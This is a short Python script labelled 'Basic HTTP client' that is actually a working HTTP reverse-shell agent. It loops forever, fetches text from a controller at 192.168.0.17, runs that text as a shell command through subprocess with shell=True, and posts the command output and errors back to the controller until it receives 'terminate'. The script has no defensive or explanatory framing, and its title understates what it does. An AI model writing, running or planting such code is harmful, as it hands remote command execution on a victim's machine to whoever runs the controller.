#Basic HTTP client


import requests     # Download Link    https://pypi.python.org/pypi/requests#downloads
import subprocess 
import time


while True: 

    req = requests.get('http://192.168.0.17')      # Send GET request to the server
    command = req.text                             # Store the received txt into command variable
        
    if 'terminate' in command:
        break 

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.17', data=CMD.stdout.read() )  # POST the result 
        post_response = requests.post(url='http://192.168.0.17', data=CMD.stderr.read() )  # or the error -if any-

    time.sleep(3)
